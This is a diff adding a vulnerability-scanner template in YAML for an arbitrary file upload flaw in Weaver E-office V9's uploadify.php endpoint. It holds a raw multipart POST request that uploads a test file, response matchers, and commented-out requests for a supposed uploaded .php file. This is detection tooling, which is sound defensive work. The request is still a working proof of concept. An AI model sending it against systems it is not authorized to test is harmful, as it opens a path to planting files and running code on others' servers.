@@ -1,0 +1,59 @@
+id: e-office9-upload
+
+info:
+  name: 泛微(Weaver) E-office V9 - 任意文件上传漏洞
+  author: wintry
+  severity: critical
+  description: 泛微 E-office V9 /inc/jquery/uploadify/uploadify.php 存在任意文件上传漏洞.
+  remediation: 升级产品到最新版本或者访问官网获取漏洞补丁.
+  tags: eoffice
+  metadata:
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68
+        Connection: close
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+
+        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+        Content-Disposition: form-data; name="Filedata"; filename="random.txt"
+        Content-Type: application/octet-stream
+
+        123456789vb
+
+        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
+        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
+
+      # - |
+      #   GET /attachment/字符串/666.php HTTP/1.1
+      #   Host: {{Hostname}}
+
+      # - |
+      #   GET /random.php HTTP/1.1
+      #   Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '[0-9]+'
+      # - type: word
+      #   part: body
+      #   words:
+      #     - "fd8652aa0862477420dc1c7e51c02a73"
+
+      - type: status
+        status:
+          - 200
+
+#date 2023/08/10
